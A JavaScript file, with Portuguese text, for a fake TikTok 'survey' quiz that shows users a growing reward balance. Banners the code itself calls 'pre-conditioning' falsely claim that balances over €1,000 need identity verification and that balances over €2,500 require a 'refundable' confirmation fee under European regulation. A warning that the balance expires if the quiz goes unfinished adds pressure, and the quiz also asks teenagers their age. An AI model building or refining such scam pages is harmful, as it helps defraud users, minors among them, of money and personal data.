/**
 * Quiz questions and logic - 7 questions with pre-conditioning
 */

const quizQuestions = [
  {
    id: 1,
    question: "Como avalias a tua experiencia geral no TikTok?",
    options: [
      { emoji: "\uD83D\uDE0D", text: "Excelente" },
      { emoji: "\uD83D\uDE0A", text: "Boa" },
      { emoji: "\uD83D\uDE10", text: "Regular" },
      { emoji: "\uD83D\uDE12", text: "Ruim" }
    ]
  },
  {
    id: 2,
    question: "Qual e o teu formato de video favorito no TikTok?",
    options: [
      { emoji: "\uD83C\uDFA5", text: "Video curto" },
      { emoji: "\uD83D\uDCF9", text: "Video medio" },
      { emoji: "\u23F3", text: "Video longo" },
      { emoji: "\uD83D\uDCFA", text: "Live" }
    ]
  },
  {
    id: 3,
    question: "Quantas horas por dia passas no TikTok?",
    options: [
      { emoji: "\u23F3", text: "Menos de 1 hora" },
      { emoji: "\u23F3", text: "1 a 2 horas" },
      { emoji: "\u23F3", text: "2 a 4 horas" },
      { emoji: "\u23F3", text: "4 a 6 horas" },
      { emoji: "\u23F3", text: "Mais de 6 horas" }
    ]
  },
  {
    id: 4,
    question: "Qual destes temas de conteudo mais gostas de ver no TikTok?",
    options: [
      { emoji: "\uD83D\uDE02", text: "Comedia" },
      { emoji: "\uD83D\uDC83", text: "Danca" },
      { emoji: "\u2139\uFE0F", text: "Tutoriais e dicas" },
      { emoji: "\uD83D\uDCF9", text: "Vlogs diarios" },
      { emoji: "\uD83D\uDC84", text: "Moda e beleza" }
    ]
  },
  {
    id: 5,
    question: "O que te faz seguir um criador no TikTok?",
    options: [
      { emoji: "\uD83C\uDF89", text: "Conteudo divertido" },
      { emoji: "\uD83D\uDCDA", text: "Conteudo educativo" },
      { emoji: "\uD83E\uDD1D", text: "Conexao pessoal" },
      { emoji: "\uD83D\uDD25", text: "Participacao em desafios" },
      { emoji: "\uD83D\uDCC5", text: "Frequencia de postagens" }
    ]
  },
  {
    id: 6,
    question: "Com que frequencia comentas em videos do TikTok?",
    options: [
      { emoji: "\uD83D\uDD04", text: "Sempre" },
      { emoji: "\uD83D\uDCC6", text: "Frequentemente" },
      { emoji: "\u23F3", text: "As vezes" },
      { emoji: "\uD83C\uDF27\uFE0F", text: "Raramente" },
      { emoji: "\uD83D\uDEAB", text: "Nunca" }
    ]
  },
  {
    id: 7,
    question: "Qual e a tua faixa etaria?",
    options: [
      { emoji: "\uD83E\uDDD1\u200D\uD83C\uDF93", text: "13-17 anos" },
      { emoji: "\uD83C\uDF89", text: "18-24 anos" },
      { emoji: "\uD83D\uDC69\u200D\uD83D\uDCBC", text: "25-34 anos" },
      { emoji: "\uD83D\uDC75", text: "35 anos ou mais" }
    ]
  }
];

// Pre-conditioning messages shown at specific questions
var preconditionMessages = {
  3: {
    type: 'info',
    text: 'O teu saldo ultrapassou \u20AC1.000 \u2014 para levantamentos acima deste valor, e necessaria uma verificacao de identidade.'
  },
  5: {
    type: 'warning',
    text: 'Saldo acima de \u20AC2.500 \u2014 por regulamento europeu, sera aplicada uma taxa unica de confirmacao (reembolsavel) para processar o levantamento.'
  }
};

// Quiz state
let currentQuestionIndex = 0;
let selectedOption = null;
const quizContainer = document.getElementById('quiz-container');

// Render a question
function renderQuestion(questionIndex) {
  const question = quizQuestions[questionIndex];

  // Update progress
  updateProgressBar(questionIndex, quizQuestions.length);

  // Update verification bar
  var verifyPercent = Math.round(((questionIndex) / quizQuestions.length) * 100);
  var verifyEl = document.getElementById('verify-bar-fill');
  var verifyText = document.getElementById('verify-bar-text');
  if (verifyEl) verifyEl.style.width = verifyPercent + '%';
  if (verifyText) verifyText.textContent = verifyPercent + '% verificado';

  // Pre-conditioning banner
  var precondition = preconditionMessages[questionIndex];
  var bannerHTML = '';
  if (precondition) {
    var bannerClass = precondition.type === 'warning' ? 'precondition-banner warning' : 'precondition-banner';
    bannerHTML = '<div class="' + bannerClass + '">' + precondition.text + '</div>';
  }

  // Saldo em risco after question 4
  var riskHTML = '';
  if (questionIndex >= 4) {
    riskHTML = '<div class="saldo-risk-notice">O teu saldo de \u20AC' + (typeof totalEarned !== 'undefined' ? formatCurrency(totalEarned) : '0.00') + ' expira se nao completares o quiz.</div>';
  }

  // Create the question HTML
  const questionHTML =
    '<div class="quiz-question-wrapper">' +
      bannerHTML +
      '<div class="quiz-question-number">Pergunta ' + (questionIndex + 1) + ' de ' + quizQuestions.length + '</div>' +
      '<div class="quiz-title">' + question.question + '</div>' +
      '<div class="quiz-subtitle">Seleciona uma opcao para continuares:</div>' +
      '<div class="options-container">' +
        question.options.map(function(option, index) {
          return '<div class="option" data-index="' + index + '">' +
            '<div class="option-content">' +
              '<div class="option-emoji">' + option.emoji + '</div>' +
              '<div class="option-text">' + option.text + '</div>' +
            '</div>' +
            '<div class="custom-checkbox"></div>' +
          '</div>';
        }).join('') +
      '</div>' +
      riskHTML +
      '<button id="continue-btn" class="continue-btn" disabled>Continuar</button>' +
    '</div>';

  const mountQuestion = () => {
    quizContainer.innerHTML = questionHTML;
    setupQuestionListeners(question, questionIndex);

    requestAnimationFrame(() => {
      requestAnimationFrame(() => {
        quizContainer.classList.add('quiz-enter');
      });
    });

    const handleEnterEnd = (event) => {
      if (event.target !== quizContainer || event.animationName !== 'quizFadeIn') return;
      quizContainer.classList.remove('quiz-enter');
      quizContainer.removeEventListener('animationend', handleEnterEnd);
    };
    quizContainer.addEventListener('animationend', handleEnterEnd);
  };

  if (questionIndex > 0) {
    quizContainer.classList.remove('quiz-enter');
    quizContainer.classList.add('quiz-exit');

    const handleExitEnd = (event) => {
      if (event.target !== quizContainer || event.animationName !== 'quizFadeOut') return;
      quizContainer.classList.remove('quiz-exit');
      quizContainer.removeEventListener('animationend', handleExitEnd);
      mountQuestion();
    };
    quizContainer.addEventListener('animationend', handleExitEnd);
  } else {
    mountQuestion();
  }
}

// Setup event listeners for question options
function setupQuestionListeners(question, questionIndex) {
  const options = document.querySelectorAll('.option');
  options.forEach(option => {
    option.addEventListener('click', () => {
      options.forEach(opt => opt.classList.remove('selected'));
      option.classList.add('selected');
      document.getElementById('continue-btn').disabled = false;
      selectedOption = parseInt(option.dataset.index);

      if (typeof trackContact === 'function') trackContact();
    });
  });

  const continueBtn = document.getElementById('continue-btn');
  continueBtn.addEventListener('click', () => {
    if (selectedOption === null || continueBtn.disabled) return;

    continueBtn.disabled = true;
    const selectedAnswer = question.options[selectedOption].text;
    if (typeof notifyQuestionAnswered === 'function') notifyQuestionAnswered(questionIndex + 1, selectedAnswer);
    if (typeof playCashRegisterSound === 'function') playCashRegisterSound();
    showReward(currentQuestionIndex);
  });
}

// Move to the next question
function nextQuestion() {
  currentQuestionIndex++;
  selectedOption = null;

  if (currentQuestionIndex < quizQuestions.length) {
    renderQuestion(currentQuestionIndex);
  } else {
    showFinalReward();
  }
}

// Reset the quiz
function resetQuiz() {
  currentQuestionIndex = 0;
  selectedOption = null;
  totalEarned = 0;
  rewards = generateRewards();
  currentBalance.textContent = "0";
  renderQuestion(currentQuestionIndex);
}
